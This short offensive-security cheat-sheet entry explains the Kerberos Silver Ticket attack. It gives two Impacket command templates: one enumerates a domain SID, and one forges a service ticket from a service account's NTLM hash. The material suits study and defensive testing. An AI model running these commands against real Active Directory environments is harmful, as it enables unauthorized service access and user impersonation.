### Silver Ticket
A **Silver Ticket attack** is a Kerberos attack where an attacker forges a **Kerberos Service Ticket (TGS)** using the **NTLM hash of a service account**, enabling unauthorized access to a specific service **without interacting with the Key Distribution Center (KDC)**. 

Because Kerberos encrypts a **service ticket (TGS)** with the **service account’s secret (password/NTLM/AES key)** so **only that service** can read and validate it.

- Enumerating Domain SID
```
lookupsid.py domain.local/username@dc01.domain.local
```

- Creating an Silver ticket 
```
ticketer.py -nthash <SERVICE_OR_MACHINE_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN_FQDN> -spn <SERVICE>/<TARGET_HOST> -user-id <RID> -groups <GROUP_RIDS_COMMA_SEPARATED> <USERNAME>
```

